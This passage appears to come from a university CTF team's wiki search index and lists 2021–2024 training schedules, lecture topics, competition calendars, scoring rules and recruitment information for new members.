exercise.</p> <p>The offline training location is changed to Meeting Room 551 Engineering College South Tower because of the failure to get keys to TB2 (aka, picking locks are illegal).</p> <p>Training time stays unchanged: every Saturday 2pm - 6pm.</p> <p>2021 Fall training timeline:</p> <p>14:00 - 15:00 Lecture</p> <p>15:30 - 18:00 Collaborate exercise</p>"},{"location":"Training/Schedule/2021Fall/#attendance","title":"Attendance","text":"<p>It's highly recommend you to join offline in Meeting Room 551 Engineering College South Tower, but if you have any other arrangement, online attendance is fine.</p> <p>Any pigeons absence for 3 weeks would be stewed into pigeon soup. Because after 3 weeks of patting fish, you may forget the password of your own kali image.</p>"},{"location":"Training/Schedule/2021Summer/","title":"2021 Summer Schedule","text":"<p>The summer of 2021 is focusing on the beginners and our new members of team. Summer schedule is from basics of CTF to introduction to all the categories and basic knowledge.</p>"},{"location":"Training/Schedule/2021Summer/#schedule","title":"Schedule","text":"Date Title Intro Material July 31st 2021 Operating Systems Guide to the OS course, learning about modern operating systems from Windows, Linux, to Android. About hardware, process architecture, how OS schedule procedure. Computer Systems: A Programmer's Perspective Aug 7nd 2021 Computer Network and Protocols About computer network, how Internet works and basic protocols about computer network. Computer Networking: A Top-Down Approach Aug 14nd 2021 Modern Cryptography and Mathematics Asymmetric cryptography like RSA, ECC. A mathematic definition about security and attacks to the modern cryptography. Cryptography Theory and PracticeIntroduction to Modern Cryptography Aug 21st 2021 Penetration and Hacking From CTF challenges to the penetration testing and hacking a real system. Learn about how to carry out a real attack to the computer systems. The Hacker Playbook Aug 28th 2021 Ethics of Cybersecurity &amp; Exam for CTF team Ethics of hacking and cybersecurity. From supply chain attack to Linux kernel to security research ethics. Learn about how to apply good penetration test instead of cracking. An Introduction to Cybersecurity Ethics"},{"location":"Training/Schedule/2021Summer/#training-timeline","title":"Training Timeline","text":"<p>The training location is at southern building of engineering college, 551 meeting room. If any changes to the training location, we would inform in advance.</p> <p>Welcome everyone to our training weekly.</p> <p>Summer training timeline:</p> <p>14:00 - 14:30 Chatting and review of daily challenges</p> <p>14:30 - 16:00 Lecture</p> <p>16:10 - 17:00 Training sequence 1</p> <p>17:10 - 18:00 Training sequence 2</p>"},{"location":"Training/Schedule/2021Summer/#advice","title":"Advice","text":"<p>If you have any advice to the training, and about the topics of lecture, feel free to inform me and we can update training schedule according to your needs.</p>"},{"location":"Training/Schedule/2022Fall/","title":"2022 Fall Training Schedule","text":""},{"location":"Training/Schedule/2022Fall/#tldr","title":"tl,dr;","text":"<ul> <li> <p>This semester we have both advanced training and qualification for 2022 students.</p> </li> <li> <p>Training: from 2 pm to 6 pm every Sunday at 551 Room, Southern Tower of Engineering Department.</p> </li> <li>Qualification: 3 weeks introduction and 1-week exam.</li> </ul>"},{"location":"Training/Schedule/2022Fall/#timeline","title":"Timeline","text":"<p>The first 4 weeks this semester is for the qualification, then we would have weekly training every Sunday.</p> <p>Remember we also have a CS315 course this semester.</p> Date Topic Attachments Sep, 11th Welcome, and meeting with new members. Introduction to the competitions, research, and COMPASS lab. None Sep, 18th Final Round for GDCTF 2nd, skip. None Sep, 25th Bytecode CTF. None Oct, 2nd Qualification, and introduction of CTF for 2022 students. Introduction to CTF.pdfLinux challengesLinux tutorialPython tutorial Oct, 9th Basics about OS, Web, and fundamentals programming. Web Basics and Databases.pdfCTF101 Web Oct, 16th Reverse engineering, GLIBC, and how to exploit a binary program. Reverse.pdfBinary Exploitation.pdf Oct, 23th Qualification Exam: CTF track and AWD track. None Oct, 30th PWN, stack, heap, and kernel. Kernel PWN Introduction Nov, 6th Reversing different kinds of applications, desktop, mobile, and embedded. newbie dive into binary Nov, 20th Modern cryptography, ECC, RC4, and AES. iThome ironman Nov, 27th Attack-with-Defense, EDR, network sniffing, and trojan. Post Penetration Dec, 4th COMPASS CTF Event (Jeopardy). None Dec, 11th COMPASS CTF Event (AWD). None Dec, 17th Summary of 2022 Fall Training. TBA"},{"location":"Training/Schedule/2022Fall/#contact-me","title":"Contact me","text":"<p>Your advice is valuable and would help me to improve the training. If you have any suggestions, there are several ways to contact me:</p> <ul> <li> <p>Weekly meeting: every Thursday, at 16 pm, according to the weekly meeting page.</p> </li> <li> <p>My email address: <code>liz33#mail.sustech.edu.cn</code></p> </li> <li> <p>My office address: 441A, Southern Tower of the Engineering Department.</p> </li> </ul>"},{"location":"Training/Schedule/2022Spring/","title":"2022 Spring Time Schedule","text":"<p>The time schedule for 2022 takes competition as major tasks. Currently, we have enough training for CTF techniques. Some of the competitions from 2022 Feb to 2022 July would be listed here.</p> <p>Be aware that the time schedule may adjust according to the competition arrangement.</p>"},{"location":"Training/Schedule/2022Spring/#weekly-schedule","title":"Weekly Schedule","text":"<p>Every week we would have at least ONE competition and ONE presentation slide. The activity would be both online / offline. Online meeting for those can't participate in the offline meeting, while offline is the major component.</p> <p>Location: 515 Meeting Room, Southern Tower of Engineering Department</p> <p>Time: every Saturday from 2 pm to 6 pm</p> <p>Snacks and teatime are also included.</p>"},{"location":"Training/Schedule/2022Spring/#timeline","title":"Timeline","text":"Competition Time Format Comment DefCamp CTF 2022 Online 11 Feb, 17:00 CST \u2014 13 Feb 2022, 23:00 CST Jeopardy Rating weight: 43.08 CInsects CTF 2022 19 Feb, 19:00 CST \u2014 20 Feb 2022, 04:00 CST Attack-Defense AWD exercise Codegate CTF 2022 Preliminary 26 Feb, 18:00 CST \u2014 27 Feb 2022, 18:00 CST Jeopardy Top 10 teams will go on to the final match D^3CTF 2022 04 March, 20:00 CST \u2014 06 March 2022, 20:00 CST Jeopardy Top 12 teams will get awards DaVinciCTF 2022 12 March, 00:00 CST \u2014 14 March 2022, 00:00 CST Jeopardy Rating weight: 24.50 VolgaCTF 2022 Qualifier 19 March, 23:00 CST \u2014 20 March 2022, 23:00 CST Jeopardy Top teams will be invited to participate in VolgaCTF 2022 Final LINE CTF 2022 26 March, 08:00 CST \u2014 27 March 2022, 08:00 CST Jeopardy Rating weight: 23.68 Midnight Sun CTF 2022 Quals 02 April, 18:00 CST \u2014 03 April 2022, 18:00 CST Jeopardy Rating weight: 27.82 PlaidCTF 2022 09 April, 05:00 CST \u2014 11 April 2022, 05:00 CST Jeopardy Rating weight: 93.67 CUCTF 1.0 23 April, 2022, 06:30 UTC \u2014 23 April, 2022, 12:30 UTC Jeopardy This CTF will be in collaboration of WIZCON '22 which aims to introduce beginners to Capture the Flags. (Empty) 30 May, 2022 (Empty) Welcome back to campus 2022\u5e74\u6625\u79cb\u676f\u7f51\u7edc\u5b89\u5168\u8054\u8d5b-\u6625\u5b63\u8d5b 2022-05-07 09:00:00 - 2022-05-07 19:00:00 Jeopardy \u6708\u8d5b\u91c7\u7528\u6301\u7eed\u62a5\u540d\u7684\u5f62\u5f0f\uff0c\u51e1\u62a5\u540d\u8fc7\u672c\u5c4a\u5b63\u8d5b\u6216\u4efb\u4e00\u6708\u8d5b\u7684\u9009\u624b\u65e0\u987b\u91cd\u590d\u62a5\u540d\uff0c\u53ef\u76f4\u63a5\u8fdb\u884c\u53c2\u8d5b\u3002 VolgaCTF 2022 Qualifier 14 May 2022, 15:00 UTC \u2014 15 May 2022, 15:00 UTC Jeopardy VolgaCTF 2022 Qualifier is an online competition. Top teams will be invited to participate in VolgaCTF 2022 Final, which will be held in Samara, Russia. \u5e7f\u4e1c\u5927\u5b66\u751f\u7f51\u7edc\u5b89\u5168\u653b\u9632\u5927\u8d5b 21 May 2022 - 22 May 2022 Question + Jeopardy The top 30 teams would be qualified to the final round. DEF CON 30 28 May 2022 - 30 May 2022 Jeopardy Top hacking activity Google CTF \u661f\u671f\u516d, 02 \u4e03\u6708 2022, 02:00 CST \u2014 \u661f\u671f\u4e00, 04 \u4e03\u6708 2022, 02:00 CST Jeopardy Google's annually CTF FAUST CTF 2022 \u661f\u671f\u516d, 09 \u4e03\u6708 2022, 20:00 CST \u2014 \u661f\u671f\u65e5, 10 \u4e03\u6708 2022, 05:00 CST AWD Top AWD activity"},{"location":"Training/Schedule/2022Spring/#personal-showcase","title":"Personal Showcase","text":"<p>The CTF team members will be invited to have a presentation every week before the competition. The goal of the showcase is to improve and sharing.</p> <p>The topic of the presentation can be various from challenge writeup to recently vulnerabilities. Anything useful for cybersecurity is fine.</p> <p>The current arrangement for the showcase:</p> <p>TBA</p>"},{"location":"Training/Schedule/2022Spring/#weekly-meeting","title":"Weekly Meeting","text":"<p>Every Thursday we would have a short meeting online. If you have any question or advice, it's highly recommend to join the meeting and share with us.</p> <p>The online meeting channel (welcome to public participation): https://meeting.tencent.com/p/4484894504</p> <p>The offline meeting office room: Southern Tower of the Engineering Department, 515.</p>"},{"location":"Training/Schedule/2022Summer/","title":"2022 Summer Training Schedule","text":""},{"location":"Training/Schedule/2022Summer/#tldr","title":"tl,dr;","text":"<ul> <li>Training time: from June, 19th to August, 14th.</li> <li>Offline training would be held every Sunday from 9 am to 6 pm in 551 Meeting Room, Southern Tower of the Engineering Department.</li> <li>Two tiers: basic level and advanced level.</li> <li>The qualification exam would be on August 13th and 14th.</li> <li>Enjoy your tour of CTF and the infosec.</li> </ul>"},{"location":"Training/Schedule/2022Summer/#timeline","title":"Timeline","text":"<p>The time schedule would according to the weekly training topics. Every week, we would have a topic to focus on. During the training time, our timeline is set to the following table.</p> Time Topic Introduction Material June, 26th CTF Overview &amp; Fun-oriented challenges. Learn about what's CTF and how we win a CTF. The attendance of competitions and how to group a team. Introduction to CTF.pdfSakai pageKali LinuxLinux challengesLinux tutorialPython tutorial July, 3rd Web Challenges and Databases (Basics) Ability to learn computer networks and hack websites. Know HTTP &amp; HTTPS in protocol, and tools to capture / modify packets. Web Basics and Databases.pdfOWASP vulnerabilitiesPHP basicsHTML MDNCSS MDNJavaScript MDN July, 10th Practice, Solving Web Challenges (Advanced) Why websites are vulnerable, learn how to crack a website and solve some web challenges. Find the weakness in the websites, and common vulnerabilities. Advanced Web Hacking.pdfLinux BasicsBlackHat SSTI PDFCTF101 WebWeb learning notes July, 17th Forensics &amp; Steganography Analyze the file format and hidden information. Packet or network traffic analysis as well. Several skills to check images. Forensics_Steganography.pdfCTF 101 Forensics1earn Forensics July, 24th Modern Cryptography and Mathematics Asymmetric cryptography like RSA, ECC. A mathematic definition of security and attacks on modern cryptography. Cryptography.pptxIntroduction to Modern Cryptography: Principles and ProtocolsTrapping ECC with Invalid Curve Bug Attacks July, 31st Assembly Language and Reverse Engineering Learn about some CISC knowledge. Use x86_64 as example to do assembly. Some reverse engineering skills are involved. Reverse.pdf August, 7th Binary Exploitations PWN challenges. Buffer overflows, shellcodes, ROP, and some pwn challenges. Binary Exploitation.pdf August, 13th Report and Summary Before the final exam, we would have a report week to share your learning and conclusion on the CTF. TBA August, 14th Exam Brand new challenges to solve this year, and winners would be qualified to the team. TBA"},{"location":"Training/Schedule/2022Summer/#time-arrangement","title":"Time arrangement","text":"<p>We usually would have our offline training in the 551 Meeting Room, Southern Tower of the Engineering Department. The time of the offline meeting would be on Sundays.</p> <p>From the offline training, you can have a summary of the past week's challenges and topics. The schedule of this day would be like this:</p> <p>2022 Summer training timeline:</p> <ul> <li>9:00 - 10:00 quick review of the last week, a summary of the self-learning materials.</li> <li>10:20 - 11:50 challenge solving and summary.</li> <li>14:00 - 16:00 Lecture on the topic.</li> <li>16:20 - 18:00 Question solving and teamwork.</li> </ul>"},{"location":"Training/Schedule/2022Summer/#training-tiers","title":"Training tiers","text":"<p>For the students who won't be able to participate the whole time, we can still have a more relaxed timeline.</p>"},{"location":"Training/Schedule/2022Summer/#advanced-level","title":"Advanced level","text":"<p>In order to join the compass team and attend competitions in the future, we need to have a more advanced skills. In the training, you should make sure that you are great at your specified area.</p> <ul> <li>Every week, you have to join the weekly training. We may not have a sign-up every week, but if you choose this level, I would appreciate you participating in the offline training.</li> <li>We would publish some challenges for the week. Your score would be noted in the database, and don't forget to finish them.</li> <li>An experienced team member would help you to learn about everything. It's free to ask questions.</li> <li>You may need to take extra time to learn expanded materials besides the topic this week.</li> </ul> <p>Taking the advanced level isn't easy, and you would get 5 extra points for the total score.</p>"},{"location":"Training/Schedule/2022Summer/#basic-level","title":"Basic level","text":"<p>If you don't want to fully participate in the training, and just want to learn something about computer security and CTF by interest. The basic level is enough.</p> <ul> <li>The weekly training's morning half can be optional. But the afternoon half is still very useful.</li> <li>The weekly challenges sometimes are fun, you can learn a lot from finishing the easy and the medium difficulty challenges.</li> <li>Ask in the group and every question would be answered.</li> </ul> <p>You can still participate in the final exam. If your score is high enough (which means you are so talented in the CTF), it's our honor to have you on the team.</p>"},{"location":"Training/Schedule/2022Summer/#exam-and-the-score","title":"Exam and the score","text":"<p>The training schedule isn't a course or something you need to rat race to get an A-level score. But, I think taking some grades can be feedback on your learning.</p> <p>How to join the compass team? Sometimes, joining the CTF competitions can be done by oneself, but usually, we need teamwork to get a better grade in the competitions. You don't want your teammate to be a newbie, right? The exam and the score are used to make sure that every member is great.</p> <p>Thus, if you find anything that is non-reasonable in our score system, please write an email to me. I would appreciate having your advice.</p> <p>The scoring system won't have a cap, you can get as many points if you want. However, I don't like the rat race. So, every category would have a percentage in the result.</p> <p>The final score formula is: <code>score = weight * sum(percent * log(2, score))</code></p> <p>The categories involves,</p> <ul> <li>Evaluation of the weekly challenges, and competitions: 30%.</li> <li>Remark from the team members: 10%.</li> <li>The sharing and the report score: 15%.</li> <li>The final exam: 100%.</li> </ul> <p>The weight would be according to your grade. A freshman in the university is less experienced compared with the senior students, but from future learning, a freshman can have more time to improve. The weight is in order to balance the grades.</p> <ul> <li>Freshman (grade 1): +6%.</li> <li>Sophomore (grade 2): +4%.</li> <li>Junior (grade 3): +2%.</li> </ul> <p>This is summer training, and we won't have any senior members (they are already graduated).</p> <p>For example, if you got 3127 in the challenges and competitions, 155 in the remarks, 229 in the report, and 1625 in the final exam. You are a freshman in the university and just finished your first year. The total score would be: <code>1.06 * (0.3 * 11.610563503925041 + 0.1 * 7.2761244052742375 + 0.15 * 7.839203788096944 + 1 * 10.66622400280318) = 17.016059226486018</code>.</p>"},{"location":"Training/Schedule/2022Summer/#contact","title":"Contact","text":"<p>Your advice is valuable and would help me to improve the training. If you have any suggestions, there are several ways to contact me:</p> <ul> <li>Weekly meeting: every Thursday, at 16pm, according to the weekly meeting page.</li> <li>My email address: <code>liz33#mail.sustech.edu.cn</code></li> <li>My office address: 441A, Southern Tower of the Engineering Department.</li> <li>My Boss, Fengwei, Zhang's office address: 515, Southern Tower of the Engineering Department.</li> </ul>"},{"location":"Training/Schedule/2023Spring/","title":"2023 Spring Training Schedule","text":"<p>We will have several written/video-based remedial content sessions before we begin training for Spring 2023 (the timing will be prior to the start of Spring 2023 training).</p> <p>For the spring 2023 program, we will continue to use the same weekly training format as before, and we will accept your suggestions to add a sharing and combination of questions to the training, and add more practical content in addition to theory.</p> <p>Each week, I will also post an archived replay of a recent competition, or a self-practice session on a selected topic, which you are free to arrange according to your schedule. Of course, if there is a competition planned for the week, the competition topic review will be delayed/reduced/cancelled.</p>"},{"location":"Training/Schedule/2023Spring/#remedial-content-session","title":"Remedial Content Session","text":"<p>In these tutorials, I will sync the written content to our wiki for use as an introduction to cybersecurity, currently selected content is</p> <ul> <li>What is cybersecurity and the hacker attitude.</li> <li>Installation and basic operation of Linux-based operating systems.</li> <li>Simple programming using the Python language, including math, networking and image processing.</li> <li>How to use Sagemath to perform mathematical operations.</li> <li>Network packet capture and analysis via Burp Suite or Fiddler.</li> <li>Understanding file structure and using a hex editor.</li> <li>Reverse executables such as ELF and PE via IDA or Ghidra.</li> <li>Basic content and exploitation of binary vulnerabilities.</li> <li>Creating containers with Docker and container management with K8S.</li> </ul> <p>This content will be updated gradually in the form of written materials or video images and will not be available in offline training sessions.</p>"},{"location":"Training/Schedule/2023Spring/#spring-2023-program","title":"Spring 2023 Program","text":"<p>In the spring 2023 program, we have two components: recruitment of new members and advanced training. After a semester of competition and training, everyone's cybersecurity level and ability have been improved, and I will focus on deepening learning in a certain direction in this semester.</p> <p>I will not recruit too many new members in this semester, and the final recruitment will still be conducted through the competition, mainly for the freshmen of 2022, and the number of recruits will be mainly used to make up for the number of members who will graduate after this semester.</p> <p>The number of recruits will be used to make up for the number of members who will graduate after this semester. The spring 2023 offline training and competition questions will be updated on this page.</p> Topic Category Attachment Date Network Sniff: Introduction Web https://ithelp.ithome.com.tw/articles/10245117https://ithelp.ithome.com.tw/articles/10245119https://ithelp.ithome.com.tw/articles/10246315https://ithelp.ithome.com.tw/articles/10246917 Feb. 26th, 2023 Network Sniff: Multi-platform Web https://frida.re/docs/android/ March. 5th, 2023 Network Scan Web https://websec.readthedocs.io/zh/latest/index.html March. 12th, 2023 Ethereum and Solidity: Introduction Blockchain http://www.snowywar.top/?p=3848 March. 25th, 2023 Ethereum and Solidity: Practice Blockchain http://www.snowywar.top/?p=3848 April. 2nd, 2023 IoT Security IoT https://paper.seebug.org/2048/ May. 7th, 2023 PWN: Stack PWN https://ir0nstone.gitbook.io/notes/ May. 14th, 2023 PWN: Heap PWN https://ir0nstone.gitbook.io/notes/ May. 14th, 2023 PWN: Kernel PWN https://ir0nstone.gitbook.io/notes/https://paper.seebug.org/2036/ May. 21st, 2023 Real-World Security: Penetration RW https://www.ired.team/ May. 28th, 2023 Real-World Security: Malware RW https://www.ired.team/ June. 4th, 2023 Real-World Security: Summary RW https://www.ired.team/ June. 11th, 2023"},{"location":"Training/Schedule/2023Spring/#summary","title":"Summary","text":"<p>Contact me: liz33@mail.sustech.edu.cn</p> <p>You can also send emails or communicate with Prof. Zhang. About the academic project and the COMPASS lab-related component, I will post later.</p>"},{"location":"Training/Schedule/2023Summer/","title":"2023 Summer Recruitment &amp; Training Schedule","text":"<p>A recruitment program for new members will take place in the summer of 2023. The recruitment of new members will last for 4 weeks and will be conducted jointly with South China Universities on the weekend of the 4th week.</p> <p>There will be two categories of new members: basic and expert. At the basic level, many basic computer science concepts will be mentioned, and only the basic content will be required in the recruitment training questions. At the expert level, we will focus on real cybersecurity practice (in the meantime, let me assure you already have some computer science foundation) and begin computer security training directly.</p> <p>Therefore, this article will be described according to the following table of contents:</p> <ol> <li>what the COMPASS CTF team will do to help you and what we expect you to do once you join.</li> <li>registration for new members.</li> <li>the basics of the recruitment campaign and the practice questions.</li> <li>recruitment assessment and score evaluation.</li> <li>some content that may be helpful if you are concerned about quitting.</li> <li>a detailed training schedule.</li> </ol>"},{"location":"Training/Schedule/2023Summer/#0x1-capture-the-flag-ctf-compass-ctf-team","title":"0x1. Capture The Flag, CTF &amp; COMPASS CTF team","text":"<p>Capture the Flag (CTF) is a class of security competitions that simulate real network environments and are usually divided into two categories: recreational exercises and formal competitions. In the first category, we will learn a lot of computer science and coding, programming, image encryption, and a series of other interesting knowledge, just as learning itself is an enjoyable experience, in this type of recreational practice tournament, you can get more basic knowledge about computer science and interesting experience. The latter category is better for your career development and future planning, and in recent years, CTF competitions for talent recruitment are increasingly held by companies, government departments, and universities. In formal competitions, rigorous knowledge of cybersecurity will be tested, including malicious program analysis, industrial control software analysis, or offline hacking and defense simulating real-life environments.</p> <p>At Southern University of Science and Technology, winning official competitions can get you extra points for graduate school/prize money for the school, and publicity on the official public website. In the official competitions you participate in, you can get the favor of enterprises such as Netcom, Ministry of Public Security, Ministry of Education, Ant (Alibaba Inc), or Meituan, etc. due to the different organizers.</p> <p>You can choose your training group according to your situation:</p> <ol> <li>If you plan to learn a wide range of computer science knowledge in Network Security and Computer Security and want to have a fun experience with Competition and Computer Security. I recommend you to choose the basic level.</li> <li>If you plan to join the COMPASS CTF team in the future, compete with the best students, achieve ranking, or participate in research projects, make a choice for your future planning. I recommend you to choose the Expert level.</li> </ol> <p>Of course, these two-level choices still represent different training difficulties and basic thresholds, which also need to be adjusted by your actual needs. You can also adjust your group after you have registered for new members.</p>"},{"location":"Training/Schedule/2023Summer/#0x2-registration-for-new-members","title":"0x2. Registration for new members","text":"<p>The registration form for the New Member Recruitment Program (or its online version) can be found in Appendix A. If you will be officially joining SUSTech next semester, or if you will be entering your second year at SUSTech next semester, please do not feel anxious about building up your basic knowledge; you still have plenty of time to learn and improve.</p> <p>If you are going to choose your own academic research path, the COMPASS CTF team is an affiliated team of the COMPASS lab with research on computer security, and I am very pleased to recommend the COMPASS lab.</p>"},{"location":"Training/Schedule/2023Summer/#0x3-the-basics-of-the-recruitment-campaign-and-the-practice-questions","title":"0x3. The basics of the recruitment campaign and the practice questions","text":"<p>The recruitment of new members will be divided into three parts:</p> <ol> <li>Basic knowledge training and learning.</li> <li>Daily practice questions.</li> <li>weekly training and review of topics.</li> </ol> <p>Among them, the basics of training and learning will use the CTF book written by the Nu1L team for reference. The CTF All in One book is also recommended as reference material. At the same time, I will also summarize a series of online materials, with our previous recruiting materials information to carry out.</p> <p>You do not need to complete the questions on the same day, but it is recommended that you complete the week's questions before the intensive training and Q&amp;A time every Sunday. You may have difficulty with the daily exercises, but each week we will work through the difficult questions.</p>"},{"location":"Training/Schedule/2023Summer/#0x4-recruitment-assessment-and-score-evaluation","title":"0x4. Recruitment assessment and score evaluation","text":"<p>New member recruitment is not a course, and scores are graded only for your motivation and as a reference for joining the team. We certainly don't want your teammates to have a large difference in ability level from you, which would lead to an imbalance in team strength. Therefore, if you think there is a problem with the design of the scores or have any suggestions, please feel free to contact me.</p> <p>New member recruitment scores are designed to be chaotic and evil in an uncapped mode. The final score is made up of several components. Each part of the score has a different weighting and is calculated as:</p> <p>Final score = factor * sum(weight * part score)</p> <p>First, the factor depends on your grade level. If you will be entering SUSTech in the next semester, then you will receive an additional 40% factor, and if you will be entering your second year in the next semester, then you will receive an additional 20% factor. In addition, if you choose the Expert level (which represents more daily practice with more daily commitment time), you will receive an additional 5% factor.</p> <p>The scores for each component with their corresponding weights are shown in the following table:</p> Part Weight daily challenges 100% competition participated 150% training activity 50% teammate score 100% member score 100% final competition 500%"},{"location":"Training/Schedule/2023Summer/#0x5-some-content-that-may-be-helpful-if-you-are-concerned-about-quitting","title":"0x5. Some content that may be helpful if you are concerned about quitting","text":"<p>I am very sorry if you plan to drop out during the course of your study, but if this is due to the training schedule and my factors, I humbly seek your advice and opinion.</p> <p>If you need some help, perhaps the following will help you.</p> <p>Q: I wasn't as interested in computer security as I expected it to be at the beginning.</p> <p>A: The learning path for computer security can be very steep, and you may find yourself making no significant breakthroughs for some time. The accumulation of basic knowledge content is equally important. The field of computer security may not be as exhilarating as you might expect, but as you learn more, you will be exposed to more content that a beginner would not.</p> <p>Q: The training schedule drains me.</p> <p>A: Maybe you can try to lower the level of difficulty, even if you plan to join the team, but it's not for experts only. The basic level is also possible, the difference is only the 5% extra factor.</p> <p>Q: I have other questions.</p> <p>A: You are always welcome to contact me by email or by any means. Here is my email address: liz33@mail.sustech.edu.cn, and you can also find me in my office at 441A, South Building, College of Engineering.</p>"},{"location":"Training/Schedule/2023Summer/#attachment-a-registration-form","title":"Attachment A. Registration Form","text":"<p>Before filling out the registration form, allow me to describe to you this very interesting field and the five most important maxims in this field.</p> <ol> <li>The world is full of fascinating problems waiting to be solved.</li> <li>No problem should ever have to be solved twice.</li> <li>Boredom and drudgery are evil.</li> <li>Freedom is good.</li> <li>Attitude is no substitute for competence.</li> </ol> <p>If you love cybersecurity, enjoy deciphering the maze of programs, hardware, and networks, and explore with humble curiosity and wonder, then you have the most important qualities that lead to success.</p> Key Value Student ID (or empty if you haven't joined SUSTech) Contact email address Name or nickname you prefer to be called Level (basic or expert) Experience and knowledge Interest point(s) <p>Hope you enjoy the trip!</p>"},{"location":"Training/Schedule/2023Summer/#attachment-b-reference-links","title":"Attachment B. Reference Links","text":"<p>COMPASS lab website: https://compass.sustech.edu.cn/</p> <p>Online competition &amp; challenge platform: http://detroit.sustech.edu.cn:29998/</p> <p>Online competition &amp; challenge platform (Intranet address): http://116.7.234.225:29998/</p> <p>CTF all in one gitbook: https://firmianay.gitbook.io/ctf-all-in-one/content/</p>"},{"location":"Training/Schedule/2023Summer/#attachment-c-timeline","title":"Attachment C. Timeline","text":"<p>The timeline and the topics of the training schedule are as below:</p> Date Topic Attachment Aug. 3rd 1: introduction/Linux CTF_tutorial_1___introduction Aug. 6th 2: web1 CTF_tutorial_2___web Aug. 8th 3: web2 CTF_tutorial_3___web___sqlCTF_tutorial_3___web___fileCTF_tutorial_3___web___ssrf Aug. 10th 4: forensics CTF_tutorial_4___forensics Aug. 13th 5: crypto/Python CTF_tutorial_5___cryptography Aug. 15th 6: reverse CTF_tutorial_6___reverse Aug. 17th 7: pwn1 CTF_tutorial_7___pwn Aug. 20th 8: pwn2 CTF_tutorial_8___pwn2 Aug. 22nd 9: penetration/bug bounty 5ZWK\uff1f Aug. 24th 10: awd -----BEGIN PGP MESSAGE-----Version: Keybase OpenPGP v2.1.15Comment: https://keybase.io/cryptowcBMA3ffNJS1q05yAQf9HwBZU1UsQ5m9vzr8sZKGqRE0hXz0tL/4fn+53z0ZPtPZpMC8+Lqf2LUvuxy+e7kkGQ8+9TYG0+dRXzrTqB2XLswFVYVlQYE3kPggBopuvOmYC2jbYElBs5BJReAtwMwfryF3zHi1QvES2McAlPie5t7UOZplu4+TneCzXclL07yz3Ipw6se5h+VXUEXrPpF43tCXRj3dakpTFlpiVd62WB/NlNYf8LUDWDceOqC/flwL0CEC9Jm/sCM5aynzjFuEyVSTXz5+2ppappkqyrnlhRkJWE/Tvvcg1Nw03rnpffSaT5e76JhYPNgko/Pe7NFD19xeVpyjE4KgZIGNdndEX9JDAeIYls88jN3dpaVTvPJzFP5xmvLVsEhj+g8bfCydR0vVJXirmdr7G1hdMpIYLd9R87PhW9E2TtT6AX0myazeDMSaHA===fUNF-----END PGP MESSAGE-----"},{"location":"Training/Schedule/2023Winter/","title":"Winter 2023 CTF Team Training and Competition Schedule","text":""},{"location":"Training/Schedule/2023Winter/#training-mode-adjustments","title":"Training Mode Adjustments","text":""},{"location":"Training/Schedule/2023Winter/#workshop-training-sessions","title":"Workshop Training Sessions","text":"<ul> <li>Frequency: Daily (Monday to Friday)</li> <li>Objective: To engage team members in a more interactive and discussion-focused training environment, with shorter, more intensive problem-solving sessions.</li> </ul>"},{"location":"Training/Schedule/2023Winter/#weekly-competition-participation","title":"Weekly Competition Participation","text":"<ul> <li>Schedule: Selection of one external competition each week for team participation.</li> </ul>"},{"location":"Training/Schedule/2023Winter/#monthly-recruitment-and-assessment-competition","title":"Monthly Recruitment and Assessment Competition","text":"<ul> <li>Timing: Last week of each month</li> <li>Purpose: To onboard new team members and gauge the current team's skill level with a set of brand-new, original challenges.</li> </ul>"},{"location":"Training/Schedule/2023Winter/#team-fund-usage","title":"Team Fund Usage","text":"<p>We are in the process of finalizing the specific action plan for team fund usage.</p> <ul> <li>Team Fund: A financial reserve established to support the team's needs, including but not limited to equipment purchases, service subscriptions, and competition-related expenditures.</li> </ul>"},{"location":"Training/Schedule/2023Winter/#resource-synchronization","title":"Resource Synchronization","text":"<p>A GitHub Organization will be created shortly to synchronize team resources such as solutions, projects, and administrative items.</p> <ul> <li>GitHub Organization: A unified repository for all team-related materials and resources.</li> </ul>"},{"location":"Training/Schedule/2023Winter/#automation","title":"Automation","text":"<p>We are focusing on developing new automation mechanisms to facilitate the seamless operation of various team tasks.</p> <ul> <li>Automation Proposals: Team members are encouraged to recommend processes that can be automated to reduce manual workload.</li> </ul>"},{"location":"Training/Schedule/2023Winter/#detailed-schedule-table","title":"Detailed Schedule Table","text":"<p>Below is the detailed schedule table with columns for Date, Location, Topic, Description, and Notes. Please note that the schedule is flexible and may change to accommodate new competitions or unforeseen circumstances.</p>"},{"location":"Training/Schedule/2023Winter/#schedule-table","title":"Schedule Table","text":"Date Location Topic Description Notes 2023-12-27 14:00 318 Meeting Room, Southern ToE The Missing Course 4: Data Wrangling Have you ever wanted to take data in one format and turn it into a different format? Of course, you have! That, in very general terms, is what this lecture is all about. Specifically, massaging data, whether in text or binary format, until you end up with exactly what you wanted. WS1-4.pdf 2023-12-28 17:00 318 Meeting Room, Southern ToE The Missing Course 5: Command-line Environment Exploring the power of the command-line interface (CLI) for efficient system navigation, automation, and task execution. WS1-5.pdf 2023-12-29 14:00 318 Meeting Room, Southern ToE The Missing Course 6: Version Control (Git) Comprehensive guide to using Git for version control, including best practices for collaboration and maintaining code history. WS1-6.pdf 2024-01-01 14:00 318 Meeting Room, Southern ToE The Missing Course 7: Debugging and Profiling Techniques for identifying and fixing code bugs, as well as methods for optimizing performance through profiling. WS1-7.pdf 2023-12-30 14:00 443B Meeting Room, Southern ToE ASIS CTF Finals 2023 Participation in the final round of the ASIS CTF, applying skills and teamwork in a competitive environment. https://asisctf.com/ 2024-01-02 16:00 318 Meeting Room, Southern ToE The Missing Course 8: Metaprogramming Dive into advanced programming concepts that allow programs to treat other programs as their data. WS1-8.pdf 2024-01-03 14:00 318 Meeting Room, Southern ToE The Missing Course 9: Further exploration of advanced programming topics (specific topic to be determined). WS1-9.pdf 2024-01-04 15:00 318 Meeting Room, Southern ToE The Missing Course 10: Conclusion of the Missing Course series with a focus on integrating learned skills into real-world scenarios. WS1-10.pdf 2024-01-06 14:00 443B Meeting Room, Southern ToE \u5357\u65b9\u79d1\u6280\u5927\u5b66&amp;\u4e07\u5f84\u5b89\u5168\u8054\u5408\u5ba3\u8bb2\u4f1a A joint seminar by Southern University of Science and Technology &amp; Wan Jing Security, discussing the latest trends in cybersecurity. TBA 2024-01-07 14:00 551 Meeting Room, Southern ToE IrisCTF 2024 Engaging in IrisCTF 2024 to apply CTF skills in a variety of challenges suitable for all levels of expertise. Home : IrisCTF 2024 - CTF fun for hackers of all skill levels 2024-01-14 14:00 551 Meeting Room, Southern ToE bi0sCTF 2024 Competing in bi0sCTF 2024, challenging team members with tasks designed to test and enhance their cybersecurity abilities. https://ctf.bi0s.in/ 2024-01-21 14:00 551 